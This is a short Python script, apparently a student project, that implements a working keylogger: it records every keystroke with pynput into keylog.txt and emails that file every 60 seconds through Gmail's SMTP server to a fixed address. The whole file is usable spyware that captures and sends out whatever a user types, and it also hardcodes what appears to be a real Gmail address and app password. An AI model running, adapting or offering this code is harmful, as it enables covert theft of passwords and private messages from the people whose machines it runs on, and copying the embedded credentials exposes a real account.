# Import necessary modules
import time
import smtplib
import threading
from email import encoders
from datetime import datetime
from email.mime.base import MIMEBase
from email.mime.text import MIMEText
from pynput.keyboard import Key, Listener
from email.mime.multipart import MIMEMultipart

# Get current timestamp
current_time = datetime.now()
timestamp = current_time.strftime("%d-%m-%Y")

# SMTP server configuration
port = 587
smtp_server = 'smtp.gmail.com'
sender_email = '001keshavbansal@gmail.com'
password = 'gytp ssin mrem jvki'
recipient_emails = ['2022mcb1268@iitrpr.ac.in']

# Function to send email with attachment
def sendEmail():
    subject = 'Keylog Data'
    body = 'Please find the keylog data attached.'
    message = MIMEMultipart()
    message['From'] = sender_email
    message['To'] = ', '.join(recipient_emails)
    message['Subject'] = subject
    message.attach(MIMEText(body, 'plain'))
    
    filename = "keylog.txt"
    try:
        with open(filename, "rb") as attachment:
            part = MIMEBase("application", "octet-stream")
            part.set_payload(attachment.read())
        encoders.encode_base64(part)
        part.add_header(
            "Content-Disposition",
            f"attachment; filename= {filename}",
        )
        message.attach(part)
    except FileNotFoundError:
        print(f"Error: {filename} not found.")
        return
    
    text = message.as_string()
    with smtplib.SMTP(smtp_server, port) as server:
        server.starttls()
        server.login(sender_email, password)
        server.sendmail(sender_email, recipient_emails, text)
        print('Email sent successfully!')

# Function to handle key press events
def keyPressHandler(key):
    try:
        key = str(key.char)
    except AttributeError:
        if key == Key.space:
            key = ' '
        elif key == Key.shift_r:
            key = ''
        elif key == Key.enter:
            key = '\n'
        else:
            key = str(key)
    
    # Log key press event
    with open("keylog.txt",'a') as file:
        file.write(timestamp + ' - ' + key + '\n')

# Function to start keylogger
def startKeylogger():
    with Listener(on_press=keyPressHandler) as listener:
        listener.join()

# Start keylogger in a separate thread
keyloggerThread = threading.Thread(target=startKeylogger)
keyloggerThread.start()

# Main loop to periodically send email with logs
#Currently it will run for infinite time, until the program is not closed
while True:
    time.sleep(60)  # Send email every 60 seconds
    sendEmail()
